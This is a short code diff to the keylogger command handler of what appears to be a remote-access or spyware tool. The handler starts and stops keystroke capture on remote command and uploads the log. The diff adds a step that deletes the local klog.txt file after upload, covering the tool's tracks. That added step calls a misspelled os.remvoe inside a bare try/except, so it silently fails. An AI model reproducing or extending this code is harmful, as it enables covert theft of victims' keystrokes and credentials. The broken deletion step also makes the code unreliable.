@@ -419,6 +419,7 @@ def keylogger(logger,command):
     """checks if command[1] is off or on. if on , a thread to start keylogging will start 
     if off , keylogger thread will stop. this function will handle multiple keyloggers running."""
     keylogger_thread_name = "keylog" # for threading , this way we can prevent multiple keyloggers running at the same time
+
     # if user requested keylogger to be turned on
     if split_command(command)[1] == 'start':
         keylogger_util = util.KeyLogger()
@@ -441,7 +442,15 @@ def keylogger(logger,command):
             if data[0] == False:
                 return 'upload failed'
             else:
-                return 'keylogger off. logger txt file => {0}'.format(data[1])
+                logger.info('deleting klog.txt file')
+                try:
+                    os.remvoe('klog.txt')
+                except:
+                    logger.error('keylogger file txt deletion failed')
+                finally:
+                    return 'keylogger off. logger txt file => {0}'.format(data[1])
+
+
         except:
             return 'keylogger is already off.'
         
